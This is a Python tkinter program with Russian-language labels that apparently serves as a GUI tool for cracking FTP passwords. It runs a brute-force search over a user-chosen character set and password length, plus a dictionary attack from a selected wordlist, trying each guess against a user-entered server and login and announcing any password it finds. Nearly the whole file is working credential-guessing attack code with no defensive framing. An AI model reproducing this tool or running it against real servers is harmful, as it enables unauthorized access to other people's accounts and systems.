from tkinter import *
from tkinter import filedialog as fd
from ftplib import FTP


from itertools import product
from tkinter.ttk import Progressbar
from time import sleep
path=''
path_dictionary=''
root = Tk()
l_server=Label(root, text='Введите адрес FTP сервера')
l_login=Label(root, text='Введите логин')
server_name=Entry(root, width=50)
login=Entry(root, width=50)
b2= Button(root, text='Полный перебор')
b3= Button(root, text='Выбрать словарь')
b4= Button(root, text='Перебор словарем')
l=Label(root, text='Введите символы для пароля')
e=Entry(root, width=50)
l1=Label(root, text='Введите длину пароля')
e1=Entry(root, width=50)
l2=Label(root, text='')


def open_dictionary(event):
    global path_dictionary
    path_dictionary=fd.askopenfilename()

b3.bind('<Button-1>', open_dictionary)
pb=Progressbar(root,mode="determinate", length=100)
def hack(event):
    for y in range(101):
        pb.configure(value=y)
        pb.update()
        sleep(0.02)

    count=4
    while count<=int(e1.get()):
      for i in product(e.get(), repeat=count):

        try:
            ftp = FTP(server_name.get())
            ftp.login(user=login.get(), passwd=''.join(i))
            ftp.quit()
            data = ftp.dir()
            print(data)
        except:
            l2['text'] =('The {} word not matched.'.format(''.join(i)))

        else:
            l2['text'] =('Wow ! found the password: {}'.format(''.join(i)))
            break
      count+=1

b2.bind('<Button-1>', hack)



def hack_dictionary(event):
    for y in range(101):
        pb.configure(value=y)
        pb.update()
        sleep(0.02)

    with open(path_dictionary, 'rb') as password_list:
        for line in password_list:

            try:
                ftp = FTP(server_name.get())
                line = line.replace(b'\n', b'')
                a = line.decode('ASCII')
                ftp.login(user=login.get(), passwd=a)
                ftp.quit()
            except:
                l2['text'] =('The {} word not matched.'.format(a))
            else:
                l2['text'] =('Wow ! found the password: {}'.format(a))
                break

b4.bind('<Button-1>', hack_dictionary)
l_server.pack()
server_name.pack()
l_login.pack()
login.pack()
l.pack()
e.pack()
l1.pack()
e1.pack()
b2.pack()
b3.pack()
b4.pack()
l2.pack()
pb.pack()
root.mainloop()

